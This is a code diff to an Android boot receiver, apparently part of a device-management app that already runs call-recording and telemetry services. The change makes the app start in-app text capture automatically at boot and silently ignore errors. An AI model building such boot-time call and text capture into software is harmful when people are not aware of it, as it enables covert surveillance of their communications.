@@ -6,6 +6,7 @@ import android.content.Intent;
 
 import com.company.devicemgr.services.CallRecorderService;
 import com.company.devicemgr.services.ForegroundTelemetryService;
+import com.company.devicemgr.utils.InAppTextCaptureManager;
 import com.company.devicemgr.utils.AppRuntime;
 
 public class BootReceiver extends BroadcastReceiver {
@@ -29,6 +30,13 @@ public class BootReceiver extends BroadcastReceiver {
                 if (started) {
                     Intent svc = new Intent(context, ForegroundTelemetryService.class);
                     AppRuntime.startServiceCompat(context, svc, true);
+                }
+            }
+
+            if (InAppTextCaptureManager.isCaptureEnabled(context)) {
+                try {
+                    AppRuntime.ensureInAppTextCaptureStarted(context);
+                } catch (Exception ignored) {
                 }
             }
 
